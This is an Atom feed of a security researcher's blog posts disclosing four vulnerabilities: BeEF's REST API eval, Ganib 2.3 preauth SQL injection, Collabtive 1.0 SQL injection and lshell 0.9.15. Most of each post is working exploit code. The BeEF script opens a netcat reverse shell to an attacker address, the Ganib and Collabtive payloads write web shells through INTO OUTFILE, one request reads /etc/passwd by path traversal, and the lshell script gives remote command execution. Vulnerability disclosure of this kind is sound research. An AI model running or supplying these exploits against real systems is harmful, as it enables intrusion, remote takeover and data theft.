<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulnerability | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/vulnerability/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2020-08-10T13:11:36-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[rce in browser exploitation framework (BeEF)]]></title>
    <link href="http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef/"/>
    <updated>2014-05-13T19:57:53-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef</id>
    <content type="html"><![CDATA[<p>Let me preface this post by saying that this vulnerability is <em>already fixed</em>, and was caught pretty early during the development process.  The vulnerability was originally introduced during a merge for the new DNS extension, and was promptly <a href="https://github.com/beefproject/beef/commit/39e672f4207aa46c4c0c11e0ce21cbaa3ab45d71">patched</a> by antisnatchor on 03022014.  Although this vulnerability was caught fairly quickly, it still made it into the master branch.  I post this only because I&rsquo;ve seen too many penetration testers leaving their tools externally exposed, often with default credentials.</p>

<p>The vulnerability is a trivial one, but is capable of returning a reverse shell to an attacker.  BeEF exposes a REST API for modules and scripts to use; useful for dumping statistics, pinging hooked browsers, and more.  It&rsquo;s quite powerful.   This can be accessed by simply pinging <code>http://127.0.0.1:3000/api/</code> and providing a valid token.  This token is static across a single session, and can be obtained by sending a POST to <code>http://127.0.0.1:3000/api/admin/login</code> with appropriate credentials.  Default credentials are beef:beef, and I don&rsquo;t know many users that change this right away.  It&rsquo;s also of interest to note that the throttling code does not exist in the API login routine, so a brute force attack is possible here.</p>

<p>The vulnerability lies in one of the exposed API functions, <code>/rule</code>.  The code for this was as follows:</p>

<p>```</p>

<h1>Adds a new DNS rule</h1>

<pre><code>    post '/rule' do
      begin
        body = JSON.parse(request.body.read)

        pattern = body['pattern']
        type = body['type']
        response = body['response']

        # Validate required JSON keys
        unless [pattern, type, response].include?(nil)
          # Determine whether 'pattern' is a String or Regexp
          begin

            pattern_test = eval pattern
            pattern = pattern_test if pattern_test.class == Regexp
</code></pre>

<p>   #             end</p>

<pre><code>          rescue =&gt; e;
          end
</code></pre>

<p>```</p>

<p>The obvious flaw is the eval on user-provided data.  We can exploit this by POSTing a new DNS rule with a malicious pattern:</p>

<p>```
import requests
import json
import sys</p>

<p>def fetch_default(ip):</p>

<pre><code>url = 'http://%s:3000/api/admin/login' % ip
headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
data = { 'username' : 'beef', 'password' : 'beef' }

response = requests.post(url, headers=headers, data=json.dumps(data))
if response.status_code is 200 and json.loads(response.content)['success']:
    return json.loads(response.content)['token']
</code></pre>

<p>try:</p>

<pre><code>ip = '192.168.1.6'

if len(sys.argv) &gt; 1:
    token = sys.argv[1]
else:
    token = fetch_default(ip)

if not token:
    print 'Could not get auth token'
    sys.exit(1)

url = 'http://%s:3000/api/dns/rule?token=%s' % (ip, token)
sploit = '%x(nc 192.168.1.97 4455 -e /bin/bash)'

headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
data = { 'pattern' : sploit,
         'type' : 'A',
         'response' : [ '127.0.0.1' ]
       }

response = requests.post(url, headers=headers, data=json.dumps(data))
print response.status_code
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>```</p>

<p>You could execute ruby to grab a shell, but BeEF restricts some of the functions we can use (such as exec or system).</p>

<p>There&rsquo;s also an instance of LFI, this time using the server API.  <code>/api/server/bind</code> allows us to mount files at the root of the BeEF web server.  The path defaults to the current path, but can be traversed out of:</p>

<p>```
def run_lfi(ip, token):</p>

<pre><code>url = 'http://%s:3000/api/server/bind?token=%s' % (ip, token)
headers = { 'Content-Type' : 'application/json'}
data = { 'mount' : "/tmp.txt",
         'local_file' : "/../../../etc/passwd"
       }

response = requests.post(url, headers=headers, data=json.dumps(data))
print response.status_code
</code></pre>

<p>```</p>

<p>We can then hit our server at /tmp.txt for <code>/etc/passwd</code>.  Though this appears to be intended behavior, and perhaps labeling it an LFI is a misnomer, it is still yet another example of why you should <em>not</em> expose these tools externally with default credentials.  Default credentials are just bad, period.  Stop it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ganib project management 2.3 SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli/"/>
    <updated>2014-02-24T21:03:07-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli</id>
    <content type="html"><![CDATA[<p><a href="http://www.ganib.com/">Ganib</a> is a project management tool supporting all the glorious project management utilities.  The latest version, 2.3 and below, is vulnerable to multiple SQL injection vectors.</p>

<p>The first SQL injection vector is a post-auth UPDATE injection in changetheme.jsp:</p>

<p>```
String theme = request.getParameter(&ldquo;theme&rdquo;);
User user = (User) pageContext.getAttribute(&ldquo;user&rdquo;, PageContext.SESSION_SCOPE);
if( user != null &amp;&amp; user.getID() != null ) {</p>

<pre><code>DBBean db = new DBBean();

try {
    String query = "UPDATE PN_PERSON SET THEME_ID = '" + theme + "' WHERE PERSON_ID = " + user.getID();
    db.prepareStatement(query);
    db.executePrepared();
} finally {
    db.release();
}
</code></pre>

<p>```</p>

<p>It&rsquo;s obvious where the flaw is.</p>

<p>The most serious of the vectors is a preauth SQL injection vulnerability in the login POST request.  The issue with this is that user-controlled data is passed through a series of data objects, all of which fail to sanitize the data, but all of which assume the data is cleansed.</p>

<p>The initial POST request is sent to <code>LoginProcess.jsp</code>.  This builds the LogManager object, which instantiates the object with our provided username, password, and user domain; all unsanitized:</p>

<p>```
// Grab parameters from Login form
String secure = request.getParameter (&ldquo;secure&rdquo;);
String username = request.getParameter (&ldquo;J_USERNAME&rdquo;);
username = username == null ? u_name : username;
String password = request.getParameter (&ldquo;J_PASSWORD&rdquo;);
password = password == null ? pwd : password;
String userDomain = request.getParameter(&ldquo;userDomain&rdquo;);</p>

<p>[&hellip;]</p>

<p>else</p>

<pre><code>loginManager.createLoginContext(username, password, userDomain);
</code></pre>

<p>```</p>

<p>And the request, for reference:</p>

<p>```
POST /LoginProcessing.jsp HTTP/1.1
Host: 192.168.1.219:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: <a href="http://192.168.1.219:8080/">http://192.168.1.219:8080/</a>
Cookie: JSESSIONID=747813A1BB393D97FD577E2010F25F37; g.s=CE7D2D0E1293623B73B56FC239BFA23D; g.r=1; <em>sid=; </em>styp=; JSPRootURL=; cookies=true
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 109</p>

<p>theAction=submit&amp;J_USERNAME=bob%40bob.com&amp;J_PASSWORD=password&amp;language=en&amp;remember_checkbox=on&amp;userDomain=1000
```</p>

<p>Once the loginManager is instantiated, <code>loginManager.completeLogin</code> is called.  This instantiates the <code>DomainAuthenticator</code> object and attempts to login:</p>

<p>```
try
{</p>

<pre><code>domainAuthenticator = DomainAuthenticator.getInstance(this.loginContext.getDomainID(), this.loginContext.getUsername(), this.loginContext.getClearTextPassword());
domainAuthenticator.authenticate(shadowLogin, isFromSSOLogin);
statusCode = LoginStatusCode.SUCCESS;
</code></pre>

<p>}
```</p>

<p>The <code>DomainAuthenticator</code> object manages authentication with the various supported methods; domain, SSO, etc.  If you&rsquo;re still following with me, the traversal path thus far can be visualized below:</p>

<p><img class="center <a" src="href="http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg">http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg</a>"></p>

<p>Note that, so far, none of the provided input has yet to be sanitized.</p>

<p>The <code>DomainAuthenticator</code> constructor first instantiates a <code>UserDomain</code> object:</p>

<p>```
private DomainAuthenticator(String domainID, String username, String clearTextPassword)
  throws DomainException
{
  try
  {</p>

<pre><code>UserDomain domain = new UserDomain();
domain.setID(domainID);
domain.load();
setDomain(domain);

setAuthenticationContext(new AuthenticationContext(domainID, username, clearTextPassword));
</code></pre>

<p>  }
```</p>

<p>Once the <code>UserDomain</code> object is initialized, the <code>domainID</code> is set by our unsanitized <code>userDomain</code> parameter, and the load function is invoked.  The <code>load</code> function is as follows:</p>

<p>```
 public void load()</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>DBBean db = new DBBean();
try
{
  load(db);
} finally {
  db.release();
}
</code></pre>

<p>  }</p>

<p>  public void load(DBBean db)</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>loadProperties(db);

loadUsers(db);

loadSupportedConfigurations(db);
</code></pre>

<p>  }
```</p>

<p>A <code>DBBean</code> object is created, and passed into an overloaded <code>load</code> function.  This runs three other functions to build the <code>DBBean</code> object; the call we&rsquo;re interested in is <code>loadUsers</code>:</p>

<p>```
 public void loadUsers(DBBean db)</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>if (this.domainID == null) {
  throw new PersistenceException("UserDomain.loadUsers() can not proceed because the domainID is null");
}

if (this.userCollection == null) {
  this.userCollection = new DomainUserCollection();
}

this.userCollection.setDomainID(getID());
this.userCollection.load(db);
</code></pre>

<p>  }
```</p>

<p>This call invokes yet another object, <code>DomainUserCollection</code>.  Once instantiated, our yet to be sanitized <code>userDomain</code> parameter is set in the object, and the <code>load</code> function is invoked.  This function, finally, takes us to our vulnerable SQL query:</p>

<p>```
 protected void load(DBBean dbean)</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>String qstrLoadUsersForDomain = "SELECT U.USER_ID, U.USERNAME, U.DISPLAY_NAME,U.USER_STATUS FROM PN_USER_VIEW U WHERE DOMAIN_ID = " + getDomainID();

if (this.domainID == null) {
  throw new PersistenceException("DomainUserCollection.load() was unable to load the users for this domain because of an invalid (null) domainID");
}
</code></pre>

<p>  [&hellip;]</p>

<p>  dbean.executeQuery(qstrLoadUsersForDomain);
```</p>

<p>Here we can see that our controlled <code>userDomain</code> parameter is injected directly into the SQL query.  This can be exploited using a UNION SELECT with four columns to write a JSP shell out.</p>

<p>Because of the way the Tomcat applicaton&rsquo;s web.xml is configured, we cannot drop a JSP into the ROOT folder and expect it to run.  Have no fear, as the default Tomcat install built into Ganib includes both /manager and /host-manager, which provide perfect receptacles for our dumped shell:</p>

<p>```
root@jali:~/exploits# python ganib_sqli.py -i 192.168.1.64 -p /var/www/ganib/tomcat/webapps/host-manager -j ./cmd.jsp
[!] Dropping ./cmd.jsp on 192.168.1.64&hellip;
[!] Dropped at /wjdll.jsp
root@jali:~/exploits# python -c &lsquo;import requests; print requests.get(&ldquo;<a href="http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd">http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd</a>&rdquo;).content&rsquo;</p>

<p>/var/www/ganib/tomcat/bin</p>

<pre><code>1    2    3
</code></pre>

<p>root@jali:~/exploits#
```</p>

<p>There will be some issues if Ganib is running in a directory that MySQL does not have permissions to write to, and considering this is a completely portable install, it could be running from anywhere.  Of course, you can also make use of the dozens of stored procedures Ganib installs by default; such as APPLY_ADMIN_PERMISSIONS, REMOVEUSER, or CREATE_PARENT_ADMIN_ROLE; this would simply turn the query from a UNION SELECT into OR PROCEDURE().</p>

<p>I did a quick grep through the remainder of the code base and found multiple other injection vectors; most, however, were postauth.</p>

<p>```</p>

<h1>Exploit title: Ganib 2.0 SQLi</h1>

<h1>Date: 02/02/2014</h1>

<h1>Exploit author: drone (@dronesec)</h1>

<h1>More information:</h1>

<h1>Vendor homepage: <a href="http://www.ganib.com/">http://www.ganib.com/</a></h1>

<h1>Software link: <a href="http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip">http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip</a></h1>

<h1>Version: &lt;= 2.3</h1>

<h1>Fixed in: 2.4</h1>

<h1>Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3</h1>

<p>from argparse import ArgumentParser
import sys
import string
import random
import requests</p>

<p>&ldquo;&rdquo;&ldquo; Ganib 2.0 preauth SQLi PoC</p>

<pre><code>@dronesec
</code></pre>

<p>&ldquo;&rdquo;"</p>

<p>def loadJSP(options):</p>

<pre><code>data = ''

try:
    with open(options.jsp) as f:
        for line in f.readlines():
            data += line.replace("\"", "\\\"").replace('\n', '')
except Exception, e:
    print e
    sys.exit(1)

return data
</code></pre>

<p>def run(options):</p>

<pre><code>print '[!] Dropping %s on %s...' % (options.jsp, options.ip)

url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))

exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)

data = { "theAction" : "submit",
         "J_USERNAME" : "test",
         "J_PASSWORD" : "test",
         "language" : "en",
         "remember_checkbox" : "on",
         "userDomain" : exploit
       }

res = requests.post(url, data=data)
if res.status_code is 200:
    print '[!] Dropped at /{0}.jsp'.format(shell)
else:
    print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)
</code></pre>

<p>def parse():</p>

<pre><code>parser = ArgumentParser()
parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
                    required=True)
parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
                    action='store', default='/var/www/ganib')
parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')

options = parser.parse_args()
options.path = options.path if options.path[-1] != '/' else options.path[:-1]
return options
</code></pre>

<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>

<pre><code>run(parse())
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Collabtive 1.0 - SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli/"/>
    <updated>2013-06-21T22:40:53-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli</id>
    <content type="html"><![CDATA[<p><a href="http://collabtive.o-dyn.de/">Collabtive</a> is a web-based collaboration tool for project management, developed in PHP.  The latest version, Collabtive 1.0, is vulnerable to remote authenticated SQL injection.  Sourceforge page can be found <a href="http://sourceforge.net/projects/collabtive/?source=directory">here</a>, which appears to be clocking in just over 1000 downloads a week.  This issue was reported privately to the developers, and fixed in their Github <a href="https://github.com/philippK-de/Collabtive">repository</a>.</p>

<p>User profiles are viewed/managed by manageuser.php, and upon loading a profile, runs the following:</p>

<p>```
 if (!empty($start) and !empty($end)) {</p>

<pre><code>    $track = $tracker-&gt;getUserTrack($id, $fproject, $taski, $start, $end);
} elseif (is_array($fproject)) {
    foreach ($fproject as $fpro) {
        $ptrack = $tracker-&gt;getUserTrack($id, $fpro, $taski, $start, $end);
        if (!empty($ptrack)) {
            foreach ($ptrack as $mytrack) {
                array_push($track, $mytrack);
            }
        }
    }
} 
</code></pre>

<p>```</p>

<p>Of interest is the <code>getUserTrack</code> function, as follows:</p>

<p>```
function getUserTrack($user, $project = 0, $task = 0, $start = 0, $end = 0 , $lim = 50)</p>

<pre><code>{
    global $conn;
    $user = (int) $user;
    $project = (int) $project;
    $lim = (int) $lim;

    if ($project &gt; 0) {
        $sql = "SELECT * FROM timetracker WHERE user = $user AND project = $project";
        $num = "SELECT COUNT(*) FROM timetracker WHERE project = $project AND user = $user";
        $order = " ORDER BY ended ASC";
    } else {
        $sql = "SELECT * FROM timetracker WHERE user = $user";
        $num = "SELECT COUNT(*) FROM timetracker WHERE user = $user";
        $order = " ORDER BY ended ASC";
    }

    if ($task &gt; 0) {
        $sql .= " AND task = $task";
        $num .= " AND task = $task";
    }

    if ($start &gt; 0 and $end &gt; 0) {
        $start = strtotime($start);
        $end = strtotime($end . " +1 day");
        $end = $end - 1;
        $sql .= " AND ended &gt;=$start AND ended&lt;=$end ";
        $num .= " AND ended &gt;=$start AND ended&lt;=$end ";
    }

    if ($num) {
        $num = $conn-&gt;query($num)-&gt;fetch();
        $num = $num[0];
    } else {
        $num = 0;
    }
</code></pre>

<p>```</p>

<p>The start/end/task variables are not cast to integers, and are not sanitized.  Sanitization wouldn&rsquo;t do much here, anyways, as the variables are appended without quotations, so we need only space queries out from input.  For example, <code>task=1 UNION SELECT passwords FROM user</code>.  Thus we highlight the importance of parameterized queries.  Just use them.</p>

<p>This can be exploited with a simple UNION query to drop a shell:</p>

<p><code>
http://192.168.1.219/collabtive/manageuser.php?action=profile&amp;id=1&amp;task=1%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e%20INTO%20OUTFILE%20%27hcked%27;&amp;project=1
</code></p>

<p>Exploiting:</p>

<p><code>
root@jali:~/exploits# python collabtive_10_sqli.py -i 192.168.1.83 -P vlh4soc9k2t5vnp6s5d8glga17
[!] Dropping web shell on 192.168.1.83...
[!] Shell dropped.  http://192.168.1.83/collabtive/gkre4.php?rr=ls
</code></p>

<p><img class="center <a" src="href="http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg">http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg</a>"></p>

<p><a href="http://www.exploit-db.com/exploits/26410/">Exploit</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[lshell 0.9.15 pathing vulnerability]]></title>
    <link href="http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability/"/>
    <updated>2012-12-30T21:43:42-08:00</updated>
    <id>http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability</id>
    <content type="html"><![CDATA[<p>While working through Kioptrix level 4, I stumbled into <a href="https://github.com/ghantoos/lshell">lshell</a>, a limited shell environment developed in Python.  I don&rsquo;t want to walk through the vulnerability again, but at a high level versions &lt;= 0.9.15 are vulnerable to an unsanitized eval() call with user supplied input.  I couldn&rsquo;t find a working PoC, so I wrote one.</p>

<p>This will verify the install and spawn a pseudo-shell for running commands on the remote host.  While it may be more beneficial to just log in and run the exploit to spawn /bin/bash, this is a nice hacky way to quickly enumerate and tool around on the back end:</p>

<p><code>
root@bt:~/kioptrix_l4# python lshell_remote.py john ****** 192.168.1.39
[!] .............................
[!] lshell &lt;= 0.9.15 remote shell.
[!] note: you can also ssh in and execute '/bin/bash'
[!] .............................
[!] Checking host 192.168.1.39...
[+] vulnerable lshell found, preparing pseudo-shell...
$ id
uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
$ ls -l
total 48
-rwxr-xr-x 1 john john  1544 2009-01-20 19:51 install.sh
-rw-r--r-- 1 john john  7715 2009-01-20 19:06 lib_mysqludf_sys.c
-rw-r--r-- 1 john john  9934 2009-01-21 19:42 lib_mysqludf_sys.html
-rwxr-xr-x 1 john john 12896 2009-01-19 04:11 lib_mysqludf_sys.so
-rw-r--r-- 1 john john  1647 2009-01-21 19:43 lib_mysqludf_sys.sql
-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
$ ls -l | grep 'Makefile'
-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
$ exit
root@bt:~/kioptrix_l4#
</code></p>

<p>You can run pretty much everything except for binary files; this is because of the shell environment changing. I wasn&rsquo;t able to figure out a clean way to attach a TTY to the stdin/stdout/stderr, so if anyone knows of a way to do this with Paramiko, drop me a message.  I&rsquo;ll take any bug reports as well.  This requires Paramiko libraries to be installed; tested with Python 2.7.x.</p>

<p><a href="http://pastebin.com/r7LCdeTC">Pastebin</a> link for download and code:</p>

<p>```
import paramiko
import traceback
from time import sleep</p>

<p>#</p>

<h1>Exploit lshell pathing vulnerability in &lt;= 0.9.15.</h1>

<h1>Runs commands on the remote system.</h1>

<h1>@dronesec</h1>

<p>#</p>

<p>if len(sys.argv) &lt; 4:</p>

<pre><code>print '%s: [USER] [PW] [IP] {opt: port}'%(sys.argv[0])
sys.exit(1)
</code></pre>

<p>try:</p>

<pre><code>print '[!] .............................'
print '[!] lshell &lt;= 0.9.15 remote shell.'
print '[!] note: you can also ssh in and execute \'/bin/bash\''
print '[!] .............................'
print '[!] Checking host %s...'%(sys.argv[3])
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
if len(sys.argv) == 5:
    ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
else:
    ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])


# verify lshell 
channel = ssh.invoke_shell()
while not channel.recv_ready(): sleep(1)
ret = channel.recv(2048)

channel.send('help help\n')
while not channel.recv_ready(): sleep(1)
ret = channel.recv(2048)

if not 'lshell' in ret:
    if 'forbidden' in ret:
        print '[-] Looks like we can\'t execute SSH commands'
    else:
        print '[-] Environment is not lshell'
    sys.exit(1)

# verify vulnerable version
channel.send('sudo\n')
while not channel.recv_ready(): sleep(1)
ret = channel.recv(2048)
if not 'Traceback' in ret:
    print '[-] lshell version not vulnerable.'
    sys.exit(1)
channel.close()
ssh.close()

# exec shell
print '[+] vulnerable lshell found, preparing pseudo-shell...'
if len(sys.argv) == 5:
    ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
else:
    ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])

while True:
    cmd = raw_input('$ ')

    # breaks paramiko
    if cmd[0] is '/':
        print '[!] Running binaries won\'t work!'
        continue

    cmd = cmd.replace("'", r"\'")
    cmd = 'echo __import__(\'os\').system(\'%s\')'%(cmd.replace(' ',r'\t'))
    if len(cmd) &gt; 1:
        if 'quit' in cmd or 'exit' in cmd:
            break
        (stdin,stdout,stderr) = ssh.exec_command(cmd)
    out = stdout.read()
    print out.strip()
</code></pre>

<p>except paramiko.AuthenticationException:</p>

<pre><code>print '[-] Authentication to %s failed.'%sys.argv[3]
</code></pre>

<p>except Exception, e:</p>

<pre><code>print '[-] Error: ', e
print type(e)
traceback.print_exc(file=sys.stdout)
</code></pre>

<p>finally:</p>

<pre><code>channel.close()
ssh.close()
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
